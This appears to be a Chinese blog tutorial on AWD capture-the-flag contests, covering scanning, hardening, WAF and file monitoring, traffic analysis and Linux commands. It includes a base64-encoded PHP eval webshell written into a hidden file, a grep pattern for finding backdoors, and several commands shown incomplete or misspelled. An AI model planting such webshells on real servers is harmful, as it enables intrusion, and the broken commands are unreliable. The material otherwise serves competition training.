对于awd而言简单来说就是分为三步：

1.登录平台，查看规则，探索flag提交方式，比赛开始前有时间的话使用[nmap](https://so.csdn.net/so/search?q=nmap&spm=1001.2101.3001.7020)或者httpscan等工具 扫一下IP段，整理各队的IP（靶机的IP应该是比赛开始后才会给出）。

2.登录[ssh](https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020)->dump源码->D盾去后门->一人写批量脚本，一个人去修->部署waf，流量监控。

3.控制npc->加固npc（拿到别人的靶机也是一样），紧盯流量。

# 流程

## 1.登录比赛平台，查看比赛信息

连接ssh

![img](https://img-blog.csdnimg.cn/382920e1d30b49a780263a1e0bc82a9d.bmp)

一般情况下比赛方给的密码都过于简单，属于弱口令，可能存在被爆破成功的机会，登录之后，首先就是修改密码。

linux修改ssh即本地密码passwd

修改后台登录密码mysql -u root -pshow databases；use test;show tables;

select * from admin;

updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;

flush privileges;

修改mysql登录密码

方法一：mysql>set password for root[@localhost](https://github.com/localhost) =password(‘ocean888’);config.php文件中是有数据库的连接信息，执行完上条命令后**更改**此文件。

方法二：mysqladmin -uroot -p 123456 password 123 root=用户名； 123456=旧密码； 123=新密码；

## 2.[dump](https://so.csdn.net/so/search?q=dump&spm=1001.2101.3001.7020)源码

使用ssh工具保留[源码](https://so.csdn.net/so/search?q=源码&spm=1001.2101.3001.7020)，复制两份，用d盾去扫一份

注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包

或者使用scp命令。

### 数据库操作

**数据库备份**

登录数据库，命令备份数据库

mysqldump -u db_user -p db_passwd db_name > 1.sql //备份指定数据库

cd /var/lib/mysqlmysqldump -u db_user -p db_passwd > 1.sql //先进入数据库目录再备份

mysqldump —all-databases > 1.sql //备份所有数据库

**数据库还原**

mysql -u db_user -p db_passwd db_name < 1.sql //还原指定数据库

cd /var/lib/mysqlmysql -u db_user db_passwd < 1.sql //先进入数据库目录再还原

## 3.站点防御部署

### check：

1.查看是否留有后门账户

2.关注是否运行了“特殊”进程

3.是否使用命令匹配一句话

4.关闭不必要端口，如远程登陆端口，木马端口

### action：

1.d盾扫描删除预留后门文件，代码审计工具审计

2.流量监控脚本部署 

3.waf脚本部署挂waf

​     每个文件前加require_once(waf.php)

​     改 .user.ini配置文件 auto_prepend_file=<filename>; 包含在文件头auto_append_file= <        filename>; 包含在文件尾

注：如果挂了waf出现持续扣分，waf去掉（根据比赛实际情况而定）

4.文件监控脚本部署**注意：**现上好waf再上文件监控靶机没有python的话要先安python（视情况而   定）

## 4.利用漏洞进行得分

利用漏洞进行既包括自己去审计挖掘漏洞，也包括看流量分析出其他师傅发现的漏洞的复现

## 5.编写脚本批量拿分

1.通过预留后门批量拿分

2.批量修改ssh账号密码

3.通过脚本批量获取flag

4.脚本批量提交flag

以上就是awd开局所需要做的事情，下文从攻击和防御做详细介绍

# 攻击

## 服务发现

使用nmap对c段或端口进行扫描（看主办方给的靶机情况而定）

nmap

知道IP地址扫端口

```undefined
.\nmap 192.168.1.1 -p1-65535
```

扫C段

```undefined
.\nmap 192.168.1.1/24
```

根据ip列表扫，有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机

```undefined
nmap -iL ip.txt
```

nmap扫描完毕后，win按住alt键

![img](https://img-blog.csdnimg.cn/8ebe5a37febc4550855e0e11ef439c66.bmp)

 只提取端口就行

## 漏洞利用

awd中存在较多的主要是以下几种漏洞

  命令执行，直接cat /flag，尽量混淆流量也可以通过命令执行执行上传一句话木马，直接用py脚    本批量传，美哉！

```bash
echo PD9waHAgZXZhbCgkX1JFUVVFU1RbJzEnXSk7ID8+Cg==|base64 -d>>.index.php



 



# <?php eval($_REQUEST['1']); ?>
```

文件读取，直接读取或者是伪协议方式读取flag

sql注入，数据库中有flag，或者sql注入写shell

文件上传，绕过黑白名单上传一句话，小马拉大马或者不死马

awd时间一般较短，所以漏洞不会太深，比较容易发现，有的会直接放几个明显的后门，考验选手们的手速（预留后门有时候会在很明显的目录，仔细观察就可以）

# 防御

防御主要包括三个监控：

文件监控

流量监控

端口监控

## 实用命令

查找可能的password

```bash
cd /var/www/html



find .|xargs grep "password"
```

查找后门

```typescript
find /var/www/html -name "*.php" |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('
```

查找flag的位置

```typescript
使用 `find / -name *flag*` 或 `grep -rn "flag" *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分
```

备份网站源码和数据库

​      mobaxterm直接拖

备份数据库在dump源码部分有

```scss
scp -r -P Port remote_username@remote_ip:remote_folder local_file
```

检查有没有多余无用端口对外开放

```undefined
netstat -anptl
```

## 部署waf

waf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在不划算

还需要注意的是：上完waf检查服务是否可用

无check机制

部分检查允许使用部分小的waf，会检查页面完整性、服务完整性

直接github找一些waf即可。

## 克制不死马

1.强行kill掉进程后重启服务（不建议）

```perl
ps -aux|grep ‘www-data’|awk ‘{print $2}’|xargs kill -9
```

2.建立一个和不死马相同名字的文件或者目录，sleep短于不死马

3.写脚本不断删除

## 改密码

如果有弱口令，拿到密码后先更改，然后用默认密码去批量登录其他的主机

### ssh密码

ssh密码就是本机密码

passwd命令改密码

### phpmyadmin

phpmyadmin的密码就是数据库的密码，直接改mysql密码

![img](https://img-blog.csdnimg.cn/1c5d8e6d50eb4568b241a3a2624f2689.bmp)

注意：不要点击生成，直接点击执行就行了！ 

### mysql

修改mysql登录密码

方法一：

mysql>set password for root[@localhost](https://github.com/localhost) =password(‘ocean888’);

config.php文件中是有数据库的连接信息，执行完上条命令后**更改**此文件

方法二：

mysqladmin -uroot -p 123456 password 123

root=用户名； 123456=旧密码； 123=新密码；

### 后台密码

修改后台登录密码

mysql -u root -p

show databases；

use test;

show tables;

select * from admin;

updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;

flush privileges;

## 文件监控

可以使用ssh远程去连接靶机进行监控

vscode‐>ssh插件或者是phpstorm，实时在线编辑

监听还原脚本‐>5分钟还原一次

使用本地py环境运行，需要更改sshIP及端口（下附监控脚本一个）

```python
# -*- encoding: utf-8 -*-



'''



监听还原脚本‐>5分钟还原一次



@File    :   awd.py



@Time    :   2020/08/09 20:44:54



@Author  :   iloveflag 



@Version :   1.0



@Contact :   iloveflag@outlook.com



@Desc    :  The Win32 port can only create tar archives,



            but cannot pipe its output to other programs such as gzip or compress, 



            and will not create tar.gz archives; you will have to use or simulate a batch pipe.



            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,



            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;



            for most purposes it is to be preferred to GNU Tar. 



'''



 



import paramiko



import os



import time



 



def web_server_command(command,transport): #对服务器执行命令



    ssh = paramiko.SSHClient()



    ssh._transport = transport



    stdin, stdout, stderr = ssh.exec_command(command)



    # print(stdout.read())



 



 



def web_server_file_action(ip, port, user, passwd, action): #对服务器文件操作



    try:



        transport = paramiko.Transport(ip, int(port))



        transport.connect(username=user, password=passwd)



        sftp = paramiko.SFTP.from_transport(transport)



        remote_path='/var/www/html/'



        remote_file = 'html.tar'



        local_path = 'C:/Users/'+os.getlogin()+'/Desktop/awd/'+ip+'/'



        web_server_command('cd '+remote_path+' && tar -cvf '+remote_file+' ./',transport)



        if not(os.path.exists(local_path)):



            os.makedirs(local_path)



        if action == 'get':



            sftp.get(remote_path+remote_file,local_path+remote_file)



            web_server_command('rm -rf '+remote_path+remote_file,transport)



            print('服务器源码保存在'+local_path)



            print('正在解压:')



            os.system('cd '+local_path+' & tar -xvf '+remote_file+' &del '+remote_file)



            print('文件解压完成')



        else:



            web_server_command('rm -rf '+remote_path+'*',transport)



            print('清理服务器web目录')



            os.system('cd '+local_path+' & tar -cvf '+remote_file+' ./*')



            sftp.put(local_path+remote_file, remote_path+remote_file)



            print('上传成功')



            web_server_command('cd '+remote_path+'&& tar -xvf '+remote_file+' && rm -rf '+remote_file,transport)



            print('还原完毕')



            print('-----------------------------')



        sftp.close()



    except:



        pass



        print('download or upload error')



 



 



def web_server_mysql_action():



    #web_server_mysql_action



    pass



def web_server_status():



    #web_server_status



    pass



if __name__ == '__main__':



    web1_server_ip='10.241.180.159'



    web1_server_port='30021'



    web1_server_user='ctf'



    web1_server_passwd='123456'



    while(1):       



        for i in range(5,0,-1):



            time.sleep(1)



            print('倒计时'+str(i)+'秒')



        web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, 'put')
```

## 常用Linux命令

```bash
ssh <-p 端口> 用户名@IP　　



scp 文件路径  用户名@IP:存放路径　　　　



tar -zcvf web.tar.gz /var/www/html/　　



w 　　　　



pkill -kill -t <用户tty>　　 　　



ps aux | grep pid或者进程名　



 



#查看已建立的网络连接及进程



netstat -antulp | grep EST



 



#查看指定端口被哪个进程占用



lsof -i:端口号 或者 netstat -tunlp|grep 端口号



 



#结束进程命令



kill PID



killall <进程名>　　



kill - <PID>　　



 



#封杀某个IP或者ip段，如：.　　



iptables -I INPUT -s . -j DROP



iptables -I INPUT -s ./ -j DROP



 



#禁止从某个主机ssh远程访问登陆到本机，如123..　　



iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP



 



#检测所有的tcp连接数量及状态



netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn



 



#查看页面访问排名前十的IP



cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　



 



#查看页面访问排名前十的URL



cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -
```

## 流量监控

流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量

被上马一定要先备份到本地，再删除、去分析反打别人

### php流量监控

```php
<?php



 



date_default_timezone_set('Asia/Shanghai');



 



$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip



 



$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名



 



$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数



 



$time = date('Y-m-d H:i:s',time()); //访问时间



 



$logadd = '来访时间：'.$time.'-->'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";



 



// log记录



 



$fh = fopen("log.txt", "a");



 



fwrite($fh, $logadd);



 



fclose($fh);



 



?>
```

## wireshark

### 过滤IP地址

```delphi
(1) ip.addr == 192.168.1.1 //只显示源/目的IP为192.168.1.1的数据包



(2) not ip.src == 1.1.1.1 //不显示源IP为1.1.1.1的数据包 



(3) ip.src == 1.1.1.1 or ip.dst == 1.1.1.2 //只显示源IP为1.1.1.1或目的IP为1.1.1.2的数据包
```

### 过滤端口

```crystal
(1) tcp.port eq 80 #不管端口是来源还是目的都显示80端口 



(2) tcp.port == 80 



(3) tcp.port eq 2722 



(4) tcp.port eq 80 or udp.port eq 80 



(5) tcp.dstport == 80 #只显示tcp协议的目标端口80 



(6) tcp.srcport == 80 #只显示tcp协议的来源端口80



(7) udp.port eq 15000 



(8) tcp.port >= 1 and tcp.port <= 80 #过滤端口范围
```

### 过滤MAC地址

```crystal
(1) eth.dst == MAC地址 #过滤目标MAC 



(2) eth.src eq MAC地址 #过滤来源MAC 



(3)eth.addr eq MAC地址 #过滤来源MAC和目标MAC都等于MAC地址的
```

### http请求方式过滤

```sql
(1) http.request.method == “GET”



(2) http.request.method == “POST” 



(3) http.host mathes “www.baidu.com|http://baidu.cn“ #matches可以写多个域名 



(4) http.host contains “http://www.baidu.com“ #contain只能写一个域名 



(5) http contains “GET” 例如： http.request.method ==”GET” && http contains “Host: “ http.request.method == “GET” && http contains “User-Agent: “ http.request.method ==”POST” && http contains “Host: “ http.request.method == “POST” && http contains “User-Agent: “ http contains “HTTP/1.1 200 OK” && http contains “Content-Type: “ http contains “HTTP/1.0 200 OK” && http contains “Content-Type: “
```

### 端口过滤

```css
抓取所有经过ens33，目的或源端口22的网络数据：



tcpdump -i ens33 port 22



指定源端口：tcpdump -i ens33 sec port 22



指定目的端口: tcpdump -i ens33 dst port 22
```

### 网络过滤

```css
tcpdump -i ens33 net 192.168.1.1



tcpdump -i ens33 src net 192.168.1.1 #源端口



tcpdump -i ens33 dst net 192.168.1.1 #目的端口
```

### 协议过滤

```css
tcpdump -i ens33 arp



tcpdump -i ens33 ip



tcpdump -i ens33 tcp



tcpdump -i ens33 udp



tcpdump -i ens33 icmp



tcpdump -w 1.pcap #抓所有包保存到1.pcap中然后使用wireshark分析
```

## awd中linux的命令

```bash
- netstat -anptl 查看开放端口



 



- ps aux 以用户为主的格式来查看所有进程



 



  pa aux | grep tomcat



 



  ps -A 显示进程信息



 



  ps -u root 显示root进程用户信息



 



  ps -ef 显示所有命令，连带命令行



 



- kill 终止进程



 



  kill -9 pid



 



  //kill -15、kill -9的区别



 



  执行kill（默认kill -15）命令，执行kill (默认kill-15) 命令，系统会发送一个SIGTERM信号给对应的程序，,大部分程序接收到SIGTERM信号后，会先kill -9命令,系统给对应程序发送的信号是SIGKILL,即exit。exit信号不会被系统阻塞，所以kill -9能顺利杀掉进程



 



- vim编辑器



 



  命令行模式下



 



  /  查找内容



 



  ?  查找内容



 



  n  重复上一条检索命令



 



  N  命令重复上一条检索命令
```

总结：打awd不能着急，就算是自己比分较低，也不要放弃，因为不到最后谁输谁赢还真说不一        定，本鱼亲身尝试！